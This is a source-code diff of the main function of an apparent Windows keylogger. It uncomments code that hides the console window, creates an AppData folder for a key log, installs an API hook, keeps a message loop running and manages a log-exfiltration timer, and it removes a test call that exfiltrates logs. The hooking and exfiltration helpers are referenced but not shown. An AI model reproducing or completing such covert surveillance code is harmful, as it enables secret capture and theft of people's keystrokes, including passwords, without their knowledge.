@@ -14,35 +14,33 @@
 int main()
 {
    
-    ////Hide console window from user.
+    //Hide console window from user.
 
-    //Auxiliary::hideConsole();
+    Auxiliary::hideConsole();
 
-    ////If console window is hidden, then...
-    //
-    //if (!Auxiliary::isConsoleVisible())
-    //{
-    //    //Create the directory where the key log, error log, as well as helper scripts will be stored.
+    //If console window is hidden, then...
+    
+    if (!Auxiliary::isConsoleVisible())
+    {
+        //Create the directory where the key log, error log, as well as helper scripts will be stored.
 
-    //    IO::createDirectory(IO::getAppDataPath());
+        IO::createDirectory(IO::getAppDataPath());
 
-    //    APIHook::installHook();
+        APIHook::installHook();
 
-    //    MSG Msg;
+        MSG Msg;
 
-    //    //Dummy loop to keep execution going
+        //Dummy loop to keep execution going
 
-    //    while (GetMessage(&Msg, NULL, 0, 0))
-    //    {
-    //        TranslateMessage(&Msg);
-    //        DispatchMessage(&Msg);
-    //    }
+        while (GetMessage(&Msg, NULL, 0, 0))
+        {
+            TranslateMessage(&Msg);
+            DispatchMessage(&Msg);
+        }
 
-    //    APIHook::logExfilTimer.stopTimer();
+        APIHook::logExfilTimer.stopTimer();
 
-    //}
-
-    Exfiltrate::exfilLogs("TEST");
+    }
 
     return 0;
 }
